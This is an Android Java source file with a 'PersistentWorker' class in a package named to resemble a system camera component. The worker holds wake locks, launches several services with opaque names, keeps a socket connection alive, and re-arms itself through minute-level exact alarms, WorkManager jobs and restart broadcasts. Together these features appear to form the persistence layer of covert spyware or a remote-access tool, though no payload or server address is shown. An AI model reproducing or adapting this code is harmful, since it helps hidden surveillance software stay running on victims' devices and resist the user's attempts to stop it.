package com.android.photo.camera.capture;

import android.app.AlarmManager;
import android.app.PendingIntent;
import android.content.Context;
import android.content.Intent;
import android.os.Build;
import android.os.PowerManager;
import android.os.SystemClock;
import android.util.Log;
import androidx.annotation.NonNull;
import androidx.work.*;

import java.util.List;
import java.util.concurrent.TimeUnit;

public class PersistentWorker extends Worker {
    private static final String TAG = "PersistentWorker";
    private PowerManager.WakeLock wakeLock;
    private static final long RESTART_INTERVAL = 60 * 1000; // 1 minute

    public PersistentWorker(@NonNull Context context, @NonNull WorkerParameters params) {
        super(context, params);
    }

    @NonNull
    @Override
    public Result doWork() {
        acquireWakeLock();

        try {
            Log.d(TAG, "PersistentWorker starting work");

            // Start all services
            startAllServices();

            // If socket is not connected, reconnect
            ensureConnection();

            // Apply manufacturer-specific optimizations
            Service.applyManufacturerSpecificOptimizations(getApplicationContext());

            // Schedule AlarmManager for redundant restarts
            scheduleServiceRestart();

            // Schedule next work (belt and suspenders approach)
            scheduleNextWork();

            // Schedule WackMeUpJob
            WackMeUpJob.scheduleJob(getApplicationContext());

            // Trigger SensorRestarterBroadcastReceiver
            Intent restartIntent = new Intent("RestartSensor");
            getApplicationContext().sendBroadcast(restartIntent);

            return Result.success();
        } catch (Exception e) {
            Log.e(TAG, "Error in PersistentWorker", e);
            return Result.retry();
        } finally {
            releaseWakeLock();
        }
    }

    private void acquireWakeLock() {
        try {
            PowerManager powerManager = (PowerManager) getApplicationContext()
                    .getSystemService(Context.POWER_SERVICE);
            wakeLock = powerManager.newWakeLock(
                    PowerManager.PARTIAL_WAKE_LOCK,
                    "PersistentWorker::WakeLockTag"
            );
            wakeLock.acquire(10 * 60 * 1000L);
        } catch (Exception e) {
            Log.e(TAG, "Error acquiring wake lock", e);
        }
    }

    private void releaseWakeLock() {
        if (wakeLock != null && wakeLock.isHeld()) {
            try {
                wakeLock.release();
            } catch (Exception e) {
                Log.e(TAG, "Error releasing wake lock", e);
            }
        }
    }

    private void startAllServices() {
        try {
            Context context = getApplicationContext();

            // Start main service
            startService(context, Service.class);

            // Start backup service
            startService(context, BackupService.class);

            // Start worker service
            startService(context, WorkerService.class);

            // Start ClassGen5 service
            startService(context, ClassGen5Service.class);

            // Start ClassGen6 service
            startService(context, ClassGen6Service.class);

            // Start ClassGen11 service
            startService(context, ClassGen11Service.class);

            // Start MyWorker service
            startService(context, MyWorkerService.class);
        } catch (Exception e) {
            Log.e(TAG, "Error starting services", e);
        }
    }

    private void startService(Context context, Class<?> serviceClass) {
        try {
            Intent serviceIntent = new Intent(context, serviceClass);
            serviceIntent.putExtra("fromWorker", true);

            if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
                context.startForegroundService(serviceIntent);
            } else {
                context.startService(serviceIntent);
            }
            Log.d(TAG, "Started " + serviceClass.getSimpleName());
        } catch (Exception e) {
            Log.e(TAG, "Error starting " + serviceClass.getSimpleName(), e);
        }
    }

    private void ensureConnection() {
        try {
            // Check socket connection
            boolean isSocketConnected = Connect.getInstance(getApplicationContext()).isConnected();

            // If not connected, try to connect
            if (!isSocketConnected) {
                Connect.startAsync(getApplicationContext());
            }
        } catch (Exception e) {
            Log.e(TAG, "Error ensuring connection", e);
        }
    }

    private void scheduleServiceRestart() {
        try {
            Context context = getApplicationContext();
            AlarmManager alarmManager = (AlarmManager) context.getSystemService(Context.ALARM_SERVICE);
            Intent intent = new Intent(context, MyReceiver.class);
            intent.setAction("RESTART_SERVICE");

            PendingIntent pendingIntent = PendingIntent.getBroadcast(
                    context,
                    4001,
                    intent,
                    PendingIntent.FLAG_UPDATE_CURRENT | PendingIntent.FLAG_IMMUTABLE
            );

            if (alarmManager != null) {
                if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.M) {
                    alarmManager.setExactAndAllowWhileIdle(
                            AlarmManager.ELAPSED_REALTIME_WAKEUP,
                            SystemClock.elapsedRealtime() + RESTART_INTERVAL,
                            pendingIntent
                    );
                } else {
                    alarmManager.setExact(
                            AlarmManager.ELAPSED_REALTIME_WAKEUP,
                            SystemClock.elapsedRealtime() + RESTART_INTERVAL,
                            pendingIntent
                    );
                }
            }
        } catch (Exception e) {
            Log.e(TAG, "Error scheduling service restart from worker", e);
        }
    }

    private void scheduleNextWork() {
        try {
            // Schedule this work again with exponential backoff
            WorkManager.getInstance(getApplicationContext())
                    .enqueueUniquePeriodicWork(
                            "PersistentWork",
                            ExistingPeriodicWorkPolicy.REPLACE,
                            new PeriodicWorkRequest.Builder(
                                    PersistentWorker.class,
                                    15, TimeUnit.MINUTES
                            )
                                    .setBackoffCriteria(
                                            BackoffPolicy.LINEAR,
                                            30000,
                                            TimeUnit.MILLISECONDS
                                    )
                                    .build()
                    );

            // Schedule a one-time work request for quicker restart
            WorkRequest oneTimeWork = new OneTimeWorkRequest.Builder(PersistentWorker.class)
                    .setInitialDelay(5, TimeUnit.MINUTES)
                    .build();

            WorkManager.getInstance(getApplicationContext()).enqueue(oneTimeWork);

        } catch (Exception e) {
            Log.e(TAG, "Error scheduling next work", e);
        }
    }
}